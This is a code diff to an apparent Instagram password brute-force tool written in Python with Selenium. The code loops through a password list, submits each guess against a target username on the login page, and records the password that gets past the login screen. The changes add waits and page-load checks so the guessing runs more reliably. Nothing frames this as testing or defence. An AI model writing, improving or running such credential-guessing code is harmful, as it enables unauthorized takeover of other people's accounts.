@@ -37,16 +37,15 @@ class Instagram:
                 passwords.append(line.strip('\n'))
         for password in passwords:
             self.browser.driver.get(self.url)
-            time.sleep(0.5)
-            email = self.browser.driver.find_element_by_name('username')
-            email.clear()
+            email = self.browser.wait_until_element_exists('name','username')
             email.send_keys(self.username)
-            pwd = self.browser.driver.find_element_by_name('password')
-            pwd.clear()
-            pwd.send_keys(password)
-            pwd.send_keys(Keys.RETURN)
-
             time.sleep(1)
+            pwd = self.browser.driver.find_element_by_name('password')
+            pwd.send_keys(password)
+            time.sleep(1)
+            pwd.send_keys(Keys.RETURN)
+            time.sleep(2)
+            self.browser.wait_page_loaded()
             url = self.browser.driver.current_url
             if (url != self.url) and ('Login' not in self.browser.driver.title):
                 found = password
